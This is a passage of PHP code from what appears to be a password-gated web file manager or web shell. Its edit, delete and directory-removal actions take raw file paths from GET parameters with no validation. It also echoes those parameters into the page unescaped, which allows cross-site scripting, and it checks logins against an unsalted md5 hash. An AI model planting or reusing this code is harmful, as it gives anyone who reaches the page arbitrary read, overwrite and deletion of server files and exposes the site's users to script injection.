                    if ( !empty( $_GET['action'] ) && !empty( $_GET['file'] ) ){
                        switch( $_GET['action'] ){

                            // -------------------- Edit mode
                            case "edit":
                               echo '
                                <div class="is_row_inner">
                                    <div class="is_card">
                                        <h3 class="card_title" style="text-transform:uppercase;">EDIT MODE</h3>
                                        <div class="is_mini_card is_field">
                                            <h6 class="card_sub">FILE NAME</h6>
                                            <h4>'. $_GET['file'] .'</h4>
                                        </div>
                                        <form method="POST">
                                            <div class="is_field">
                                                <textarea id="edit_area" name="edit_area" class="is_input" placeholder="..." rows="25">
                                                '.
                                                htmlspecialchars(file_get_contents( $_GET['file'] ) )
                                                .'
                                                </textarea>
                                            </div>
                                            <div class="is_field">
                                                <button type="submit" name="save_file" class="is_button is_primary">Save Edits</button>
                                            </div>
                                        </form>      
                                    </div>
                                </div>
                               '; 
                               if ( isset( $_POST['save_file'] ) ){
                                   $_E = $_POST['edit_area'];
                                   echo edit_file( $_GET['file'], $_E );
                                   echo "<script id=". RANDOM_ID .">setTimeout(function(){location.href='./';},3000)</script>";
                               }
                            break;

                            // -------------------- Delete file mode
                            case "delete":
                                if ( !empty( $_GET['file'] ) ){
                                   echo remove_file( $_GET['file'] );
                                   echo "<script id=". RANDOM_ID .">setTimeout(function(){location.href='./';},3000)</script>";
                                } else{
                                    echo show_toast( "Select a file to delete!" );
                                }
                            break;

                            // -------------------- Delete file mode
                            case "delete_dir":
                                if ( !empty( $_GET['dir_delete'] ) ){
                                    if ( rmdir( $_GET['dir_delete'] ) ){
                                        echo show_toast( "Directory ". $_GET[ 'dir_delete']." was deleted!");
                                        echo "<script id=". RANDOM_ID .">setTimeout(function(){location.href='./';},3000)</script>";
                                    } else{
                                        echo show_toast( "There was an error deleting the directory.");
                                        echo "<script id=". RANDOM_ID .">setTimeout(function(){location.href='./';},3000)</script>";
                                    }
                                 } else{
                                     echo show_toast( "Select a directory to delete!" );
                                 }
                            break;
                        }
                    }
                ?>
            </div>
        </div>
        <?php endif; ?>
    </div>
    <div id="snackbar"></div>
    <?php 

    // -------------------- Auth Handler
        if ( isset( $_POST['do_auth'] ) ){
            if ( md5( $_POST['auth_password'] ) != $_PASSWORD ){
                echo "<script id=". RANDOM_ID .">window.onload=function(){document.getElementById('error_message').innerHTML = 'Failed to Auth User. Enter correct credentials.';}</script>";
            } else{
                $_SESSION['is_authorized'] = "794ca0cae6==".md5( RANDOM_ID ); 
                echo "<script id=". RANDOM_ID .">location.href='./';</script>";
            }
        }
    ?>
</body>
<!-- #ZfEWMSHGyg -->
</html>
